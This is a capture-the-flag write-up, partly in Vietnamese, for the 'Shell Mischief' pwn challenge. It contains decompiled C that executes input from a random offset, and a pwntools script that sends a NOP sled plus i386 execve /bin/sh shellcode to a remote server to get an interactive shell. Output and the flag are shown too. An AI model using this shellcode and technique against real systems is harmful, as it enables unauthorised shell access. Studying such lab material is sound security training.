# Shell Mischief
## Analysis
Chương trình nhận shellcode làm đầu vào sau đó thực thi, byte bắt đầu trong shellcode được random trong khoảng [0,256]
```
undefined4 main(void) {
  long lVar1;
  undefined local_218;
  undefined auStack_217 [511];
  int local_18;
  __gid_t local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  local_14 = getegid();
  setresgid(local_14,local_14,local_14);
  puts("Enter your shellcode:");
  vuln(&local_218);
  puts("Thanks! Executing from a random location now...");
  lVar1 = rand();
  local_18 = lVar1 % 0x100 + 1;
  (*(code *)(auStack_217 + lVar1 % 0x100))();
  puts("Finishing Executing Shellcode. Exiting now...");
  return 0;
}
```
## Solution
Sử dụng kỹ thuật NOP sled:
```
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)
con = remote("34.125.199.248", 1234)

shellcode = asm(
    '''
    mov eax, 0x0b
    push 6845231
    push 1852400175
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''', arch = 'i386'
)

con.sendafter(b"shellcode:", b'\x90' * 256 + shellcode)
con.interactive()
```
```
└─$ ./exp.py
[+] Opening connection to 34.125.199.248 on port 1234: Done
[*] Switching to interactive mode
Thanks! Executing from a random location now...
$ ls
bin
boot
dev
etc
home
...
```
## Flag
```
OSCTF{u_r_b3rry_mischievous_xD}
``` 